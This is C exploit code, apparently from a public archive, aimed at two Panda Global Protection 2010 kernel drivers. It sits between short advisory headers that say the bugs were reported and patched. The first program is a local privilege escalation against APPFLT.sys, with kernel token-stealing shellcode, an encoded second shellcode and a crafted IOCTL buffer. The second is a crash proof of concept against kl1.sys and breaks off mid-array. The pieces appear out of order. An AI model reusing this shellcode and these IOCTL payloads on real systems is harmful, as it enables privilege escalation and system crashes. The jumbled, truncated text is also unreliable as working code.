This Advisory    : Heurs
Contact          : s.leberre@sysdream.com


//----- Application description


Antivirus Global Protection 2010 is the most complete product, with everything
you need to protect your computer and information. It protects you from viruses,
spyware, rootkits, hackers, online fraud, identity theft and all other Internet
threats. The anti-spam engine will keep your inbox free from junk mail while the
Parental Control feature will keep your family safe when using the Internet. You
can also back up important files (documents, music, photos, etc.) to a CD/DVD or
online (5GB free space available) and restore them in case of accidental loss or
damage. And thanks to the most innovative and new detection technologies and improved
Collective Intelligence, the solution is now much faster than previous versions. 

//----- Description of vulnerability

APPFLT.sys driver don't check inputs integers of an IOCTL. An exception can be 
thrown if we modify one DWORD.
Exploit isn't functional but with few work it can be a local privilege escalation.

//----- Credits

http://www.sysdream.com
http://www.hackinparis.com/
http://ghostsinthestack.org

s.leberre at sysdream dot com
heurs at ghostsinthestack dot org

//----- Greetings

Mysterie

*/


char ShellcodeMaster[] = 
"\x33\xf6\x33\xff\x64\xa1\x24\x01\x00\x00\x8b\x40\x44\x05\x88\x00"
"\x00\x00\x8b\xd0\x8b\x58\xfc\x81\xfb\x41\x41\x41\x41\x75\x02\x8b"
"\xf0\x83\xfb\x04\x75\x02\x8b\xf8\x8b\xd6\x23\xd7\x85\xd2\x75\x08"
"\x8b\x00\x3b\xc2\x75\xde\xeb\x10\x8b\xc7\xb9\x40\x00\x00\x00\x03"
"\xc1\x8b\x00\x8b\xde\x89\x04\x19\xba\x11\x11\x11\x11\xb9\x22\x22"
"\x22\x22\xb8\x3b\x00\x00\x00\x8e\xe0\x0f\x35";

char RealShellcode[] = 
"\x2b\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x15"
"\xf3\x1d\xb8\x83\xeb\xfc\xe2\xf4\xe9\x1b\x59\xb8\x15\xf3\x96\xfd"
"\x29\x78\x61\xbd\x6d\xf2\xf2\x33\x5a\xeb\x96\xe7\x35\xf2\xf6\xf1"
"\x9e\xc7\x96\xb9\xfb\xc2\xdd\x21\xb9\x77\xdd\xcc\x12\x32\xd7\xb5"
"\x14\x31\xf6\x4c\x2e\xa7\x39\xbc\x60\x16\x96\xe7\x31\xf2\xf6\xde"
"\x9e\xff\x56\x33\x4a\xef\x1c\x53\x9e\xef\x96\xb9\xfe\x7a\x41\x9c"
"\x11\x30\x2c\x78\x71\x78\x5d\x88\x90\x33\x65\xb4\x9e\xb3\x11\x33"
"\x65\xef\xb0\x33\x7d\xfb\xf6\xb1\x9e\x73\xad\xb8\x15\xf3\x96\xd0"
"\x29\xac\x2c\x4e\x75\xa5\x94\x40\x96\x33\x66\xe8\x7d\x8d\xc5\x5a"
"\x66\x9b\x85\x46\x9f\xfd\x4a\x47\xf2\x90\x70\xdc\x3b\x96\x65\xdd"
"\x15\xf3\x1d\xb8";

typedef struct _SYSTEM_MODULE_ENTRY
{
    ULONG  Unused;
    ULONG  Always0;
    PVOID  ModuleBaseAddress;
    ULONG  ModuleSize;
    ULONG  Unknown;
    ULONG  ModuleEntryIndex;
    USHORT ModuleNameLength;
    USHORT ModuleNameOffset;
    CHAR   ModuleName [256];
} SYSTEM_MODULE_ENTRY, * PSYSTEM_MODULE_ENTRY;


DWORD GetDataSection(HANDLE ImageBase){
    IMAGE_DOS_HEADER * mDosHeader;
    IMAGE_NT_HEADERS * mNtHeader;
    IMAGE_SECTION_HEADER * mSecHeader;
    int i;
    
    mDosHeader = (PIMAGE_DOS_HEADER) ImageBase;
    if (mDosHeader->e_magic != 0x5A4D) {
        return 0;
    }
    
    mNtHeader = (PIMAGE_NT_HEADERS) (mDosHeader->e_lfanew + ImageBase);
    if (mNtHeader->Signature != 0x00004550) {
        return 0;
    }
    
    mSecHeader = (PIMAGE_SECTION_HEADER) (mDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + ImageBase);
    for (i=0; i<mNtHeader->FileHeader.NumberOfSections; i++){
        if (!strcmp(mSecHeader->Name, ".data"))
            return mSecHeader->VirtualAddress;
        mSecHeader++;
    }
    
    return 0;
}

PVOID KernelGetModuleBase(PCHAR  pModuleName)
{
    PVOID pModuleBase = NULL;
    PULONG pSystemInfoBuffer = NULL;
    
    NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
    ULONG    SystemInfoBufferSize = 0;
    
    status = ZwQuerySystemInformation(SystemModuleInfo,
        &SystemInfoBufferSize,
        0,
        &SystemInfoBufferSize);
    
    if (!SystemInfoBufferSize){
        return NULL;
    }
    
    pSystemInfoBuffer = (PULONG)malloc(SystemInfoBufferSize*2);
    
    if (!pSystemInfoBuffer){
        return NULL;
    }
    
    memset(pSystemInfoBuffer, 0, SystemInfoBufferSize*2);
    
    status = ZwQuerySystemInformation(SystemModuleInfo,
    pSystemInfoBuffer,
    SystemInfoBufferSize*2,
    &SystemInfoBufferSize);
    
    
    if (NT_SUCCESS(status))
    {
        PSYSTEM_MODULE_ENTRY pSysModuleEntry =
        (PSYSTEM_MODULE_ENTRY)((PSYSTEM_MODULE_INFORMATION)(pSystemInfoBuffer))->Module;
        ULONG i;
        
        for (i = 0; i <((PSYSTEM_MODULE_INFORMATION)(pSystemInfoBuffer))->Count; i++)
        {
            if (_stricmp(pSysModuleEntry[i].ModuleName +
                pSysModuleEntry[i].ModuleNameOffset, pModuleName) == 0)
            {
                pModuleBase = pSysModuleEntry[i].ModuleBaseAddress;
                break;
            }
        }
    }
    
    if(pSystemInfoBuffer) {
        free(pSystemInfoBuffer);
    }
    
    return pModuleBase;
} // end KernelGetModuleBase()

int __cdecl main(int argc, char* argv[])
{
    HANDLE hDevice = (HANDLE) 0xffffffff;
    DWORD NombreByte;
    DWORD Crashing[] = {
0xaaaaaaaa, 0xbbbbbbbb, 0xcccccccc, 0xdddddddd,
0xeeeeeeee, 0x11111111, 0x001cfdea, 0x002dc6c0,
0x000000a8, 0x0044005c, 0x00760065, 0x00630069,
0x005c0065, 0x00610048, 0x00640072, 0x00690064,
0x006b0073, 0x006f0056, 0x0075006c, 0x0065006d,
0x005c0031, 0x00720050, 0x0067006f, 0x00610072,
0x0020006d, 0x00690046, 0x0065006c, 0x005c0073,
0x00610050, 0x0064006e, 0x00200061, 0x00650053,
0x00750063, 0x00690072, 0x00790074, 0x0050005c,
0x006e0061, 0x00610064, 0x00470020, 0x006f006c,
0x00610062, 0x0020006c, 0x00720050, 0x0074006f,
0x00630065, 0x00690074, 0x006e006f, 0x00320020,
0x00310030, 0x005c0030, 0x00650057, 0x00500062,
0x006f0072, 0x00790078, 0x0065002e, 0x00650078,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x00112200, 0x00112200, 0x00112200,
0x00112200, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420, 0x19653420, 0x19653420, 0x19653420,
0x19653420
        };
    char out[sizeof(Crashing)];
    DWORD ShellcodeToExecute;
    DWORD KernelImageBase;
    DWORD KernelPointerDeref;
    DWORD VirtImageBaseKnl;
    DWORD NullAddress;
    KEVENT NewKevent;
    int i = 0x1000;
    
    printf("Local Privilege Escalation - Panda Global Protection 2010 (3.01.00)\n\n");
    hDevice = CreateFile("\\\\.\\AppFlt",GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
    
    ShellcodeToExecute = (DWORD) VirtualAlloc((void*)0x00110000, 0x10000, MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    ShellcodeToExecute = (DWORD) VirtualAlloc((void*)0x00110000, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    
    ShellcodeToExecute = (DWORD) VirtualAlloc((void*)0x19653420, 0x1000, MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    ShellcodeToExecute = (DWORD) VirtualAlloc((void*)0x19653420, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    memcpy((void*)0x19653420, ShellcodeMaster, sizeof(ShellcodeMaster));
     
    KernelImageBase = (DWORD) KernelGetModuleBase("ntoskrnl.exe");
    
    if (!KernelImageBase){
       KernelImageBase = (DWORD) KernelGetModuleBase("ntkrnlpa.exe");
       VirtImageBaseKnl = (DWORD) LoadLibrary("ntkrnlpa.exe");
       KernelPointerDeref = KernelImageBase + GetDataSection((HANDLE)VirtImageBaseKnl) + 0x3C;
    } else {
       VirtImageBaseKnl = (DWORD) LoadLibrary("ntoskrnl.exe");
       KernelPointerDeref = KernelImageBase + 0x3C;
    }
    
    Crashing[469] = (KernelPointerDeref - 0x750) ^ 0x19653420;
    
    memcpy((PVOID)0x001129f9, &Crashing[60], 4);
    memcpy((PVOID)0x001129f9 + 0x4, &Crashing[60], 4);
    memcpy((PVOID)0x001129f9 + 0x8, &Crashing[60], 4);
    memcpy((PVOID)0x001129f9 + 0xC, &Crashing[60], 4);
    memcpy((PVOID)0x001129f9 + 0x10, &Crashing[60], 4);
    memcpy((PVOID)0x001129f9 + 0x16, &Crashing[60], 4);
    
    DeviceIoControl(hDevice,0x06660E1C,Crashing,sizeof(Crashing),out,sizeof(Crashing),&NombreByte,NULL);
    
    printf("Sploit Send.\nhDevice = %x\n", hDevice);
    CloseHandle(hDevice);
    getch();
    return 0;
}


#include <stdio.h>
#include <windows.h>
#include <winioctl.h>
#include <stdlib.h>
#include <string.h>

/*
Program          : Panda Global Protection 2010 (3.01.00)
Homepage         : http://www.pandasecurity.com
Discovery        : 2010/04/09
Author Contacted : 2010/07/15
Status of vuln   : Patched !
Found by         : Heurs
This Advisory    : Heurs
Contact          : s.leberre@sysdream.com


//----- Application description


Antivirus Global Protection 2010 is the most complete product, with everything
you need to protect your computer and information. It protects you from viruses,
spyware, rootkits, hackers, online fraud, identity theft and all other Internet
threats. The anti-spam engine will keep your inbox free from junk mail while the
Parental Control feature will keep your family safe when using the Internet. You
can also back up important files (documents, music, photos, etc.) to a CD/DVD or
online (5GB free space available) and restore them in case of accidental loss or
damage. And thanks to the most innovative and new detection technologies and improved
Collective Intelligence, the solution is now much faster than previous versions. 

//----- Description of vulnerability

kl1.sys driver don't check inputs integer of an IOCTL. An exception can be 
thrown if we modify one DWORD.
With my test I can't do best exploitation than a BSOD.

//----- Credits

http://www.sysdream.com
http://www.hackinparis.com/
http://ghostsinthestack.org

s.leberre at sysdream dot com
heurs at ghostsinthestack dot org

//----- Greetings

Mysterie

*/

int __cdecl main(int argc, char* argv[])
{
    HANDLE hDevice = (HANDLE) 0xffffffff;
    DWORD NombreByte;
    DWORD Crashing[] = {
0xaaaaaaaa, 0xbbbbbbbb, 0xcccccccc, 0xdddddddd,
0xeeeeeeee, 0x00000000, 0x001cfdea, 0x002dc6c0,
0x000000a8, 0x0044005c, 0x00760065, 0x00630069,
0x005c0065, 0x00610048, 0x00640072, 0x00690064,
0x006b0073, 0x006f0056, 0x0075006c, 0x0065006d,
0x005c0031, 0x00720050, 0x0067006f, 0x00610072,
0x0020006d, 0x00690046, 0x0065006c, 0x005c0073,
0x00610050, 0x0064006e, 0x00200061, 0x00650053,
0x00750063, 0x00690072, 0x00790074, 0x0050005c,
0x006e0061, 0x00610064, 0x00470020, 0x006f006c,
0x00610062, 0x0020006c, 0x00720050, 0x0074006f,
0x00630065, 0x00690074, 0x006e006f, 0x00320020,
0x00310030, 0x005c0030, 0x00650057, 0x00500062,
0x006f0072, 0x00790078, 0x0065002e, 0x00650078,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x00000000, 0x00000000, 0x00000000,
0x00000000, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
0x61616161, 0x61616161, 0x61616161, 0x61616161,
